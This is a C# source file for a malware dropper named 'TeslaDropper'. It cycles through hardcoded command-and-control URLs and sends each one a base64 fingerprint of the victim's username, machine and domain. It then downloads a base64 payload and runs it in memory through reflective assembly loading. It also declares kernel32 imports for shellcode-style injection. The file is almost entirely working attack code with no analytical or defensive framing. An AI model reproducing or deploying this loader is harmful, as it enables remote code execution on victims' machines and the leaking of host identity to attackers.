using System;
using System.Net;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace TeslaDropper
{
    internal class Program
    {
        // Optional DLL injection fallback
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string dllToLoad);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        static string[] fallbackC2 = {
            "https://cdn1.shadow-c2[.]com/payload",
            "https://d2xx.teslac2[.]org/bin",
            "https://edge-obfuskated.cloudfront[.]net/load"
        };

        static void Main(string[] args)
        {
            try
            {
                string payloadB64 = null;

                foreach (var url in fallbackC2)
                {
                    try
                    {
                        payloadB64 = new WebClient().DownloadString($"{url}?id={GetHostFingerprint()}");
                        if (!string.IsNullOrWhiteSpace(payloadB64)) break;
                    }
                    catch { continue; }
                }

                if (payloadB64 == null)
                    throw new Exception("Payload not retrieved");

                byte[] payloadBytes = Convert.FromBase64String(payloadB64);
                LoadAssembly(payloadBytes);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[x] Loader error: {ex.Message}");
            }
        }

        static void LoadAssembly(byte[] rawAssembly)
        {
            Assembly asm = Assembly.Load(rawAssembly);
            MethodInfo entry = asm.EntryPoint;
            if (entry != null)
            {
                object[] parameters = entry.GetParameters().Length == 0 ? null : new object[] { new string[] { } };
                entry.Invoke(null, parameters);
            }
        }

        static string GetHostFingerprint()
        {
            try
            {
                string user = Environment.UserName;
                string machine = Environment.MachineName;
                string domain = Environment.UserDomainName;
                return Convert.ToBase64String(Encoding.UTF8.GetBytes($"{user}:{machine}:{domain}"));
            }
            catch
            {
                return Guid.NewGuid().ToString();
            }
        }
    }
}
